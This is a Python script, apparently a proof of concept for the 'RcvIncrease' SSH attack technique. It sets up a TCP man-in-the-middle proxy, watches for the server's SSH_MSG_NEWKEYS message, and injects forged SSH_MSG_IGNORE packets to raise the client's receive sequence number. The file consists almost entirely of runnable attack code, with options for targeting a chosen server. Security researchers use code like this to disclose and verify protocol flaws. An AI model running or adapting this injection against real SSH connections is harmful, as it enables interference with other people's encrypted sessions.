#!/usr/bin/python3
from binascii import unhexlify

import click
from tqdm import trange

from common import contains_newkeys, run_tcp_mitm

#####################################################################################
## Proof of Concept for the RcvIncrease technique                                  ##
##                                                                                 ##
## Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0    ##
#####################################################################################

rogue_msg_ignore = unhexlify('0000000C060200000000000000000000')

@click.command()
@click.option("--proxy-ip", default="0.0.0.0", help="The interface address to bind the TCP proxy to.")
@click.option("--proxy-port", default=22, help="The port to bind the TCP proxy to.")
@click.option("--server-ip", help="The IP address where the SSH server is running.")
@click.option("--server-port", default=22, help="The port where the SSH server is running.")
@click.option("-N", "--increase-by", default=1, help="The number by which C.Rcv will be increased.")
def cli(proxy_ip, proxy_port, server_ip, server_port, increase_by):
    print("--- Proof of Concept for RcvIncrease technique ---", flush=True)
    print("[+] WARNING: Connection failure will occur, this is expected as sequence numbers will not match.", flush=True)
    run_tcp_mitm(proxy_ip, proxy_port, server_ip, server_port, forward_server_to_client=lambda in_socket, out_socket: inject_rcvincrease(in_socket, out_socket, increase_by))

def inject_rcvincrease(in_socket, out_socket, increase_by):
    try:
        while True:
            data = in_socket.recv(4096)
            if contains_newkeys(data):
                print("[+] SSH_MSG_NEWKEYS sent by server identified!", flush=True)
                print(f"[+] Injecting {increase_by} SSH_MSG_IGNORE messages to increase C.Rcv by {increase_by}!", flush=True)
                for _ in trange(increase_by):
                    out_socket.send(rogue_msg_ignore)
            if len(data) == 0:
                break
            out_socket.send(data)
    except ConnectionResetError:
        print("[!] Socket connection has been reset. Closing sockets.", flush=True)
    except OSError:
        print("[!] Sockets closed by another thread. Terminating pipe_socket_stream thread.", flush=True)
    in_socket.close()
    out_socket.close()

if __name__ == '__main__':
    cli()
